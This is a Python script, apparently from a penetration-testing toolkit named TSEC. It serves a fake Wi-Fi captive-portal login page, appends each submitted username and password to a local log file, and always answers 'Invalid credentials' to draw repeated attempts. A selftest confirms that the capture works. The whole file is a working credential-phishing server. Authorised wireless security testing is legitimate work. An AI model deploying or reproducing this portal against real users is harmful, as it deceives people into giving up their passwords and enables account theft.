#!/usr/bin/env python3
"""Serve a captive-portal login page and log submissions to a file.

A real HTTP server: GET returns the login page, POST appends the
credentials to --log and re-renders the page with an "error" message like
a real captive portal. The content of the log file is the evidence.

Written for TSEC. Standard library only.
"""

from __future__ import annotations

import argparse
import http.server
import sys
import threading
import time
import urllib.parse
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from tsec_engine import Report, State, check, check_eq, selftest as engine_selftest

VERSION = "2.0.0"

PAGE = """<html><head><title>Network Login</title></head>
<body style="font-family:sans-serif;text-align:center;margin-top:8%">
<h2>Wi-Fi Login</h2>
<form method="post">
<p><input name="user" placeholder="Username"></p>
<p><input name="pass" type="password" placeholder="Password"></p>
<p><button type="submit">Connect</button></p>
</form>
</body></html>"""


def make_handler(log_path: Path):
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(PAGE.encode())

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode(errors="replace")
            fields = dict(urllib.parse.parse_qsl(body))
            user = fields.get("user", "")
            pw = fields.get("pass", "")
            with log_path.open("a", encoding="utf-8") as fh:
                fh.write(f"{user},{pw}\n")
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(PAGE.replace("<h2>Wi-Fi Login</h2>",
                                          "<h2>Wi-Fi Login</h2><p style='color:red'>Invalid credentials</p>").encode())

        def log_message(self, *a):
            pass

    return H


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--log", default="/tmp/creds.log")
    ap.add_argument("--seconds", type=int, default=0, help="stop after N seconds (0 = forever)")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return engine_selftest(selftest_fn)
    report = Report("portal_serve", VERSION)
    server = http.server.HTTPServer(("0.0.0.0", args.port), make_handler(Path(args.log)))
    report.note("portal server", State.USED, "high", f"serving on port {args.port}, log at {args.log}")
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"portal_serve: http://0.0.0.0:{args.port}/ -> {args.log}")
    try:
        if args.seconds:
            time.sleep(args.seconds)
        else:
            while True:
                time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    server.shutdown()
    from tsec_engine import emit
    emit(report, args.json, None)
    return 0


def selftest_fn() -> None:
    import urllib.request
    server = http.server.HTTPServer(("127.0.0.1", 0), make_handler(Path("/tmp/tsec_portal_selftest.log")))
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        req = urllib.request.Request(f"http://127.0.0.1:{port}/", data=b"user=alice&pass=pw123",
                                     headers={"Content-Type": "application/x-www-form-urlencoded"})
        urllib.request.urlopen(req, timeout=5)
        content = Path("/tmp/tsec_portal_selftest.log").read_text()
        check("alice,pw123" in content, f"log must record the submission, got {content!r}")
    finally:
        server.shutdown()
        Path("/tmp/tsec_portal_selftest.log").unlink(missing_ok=True)


def selftest() -> None:
    selftest_fn()


if __name__ == "__main__":
    sys.exit(main())
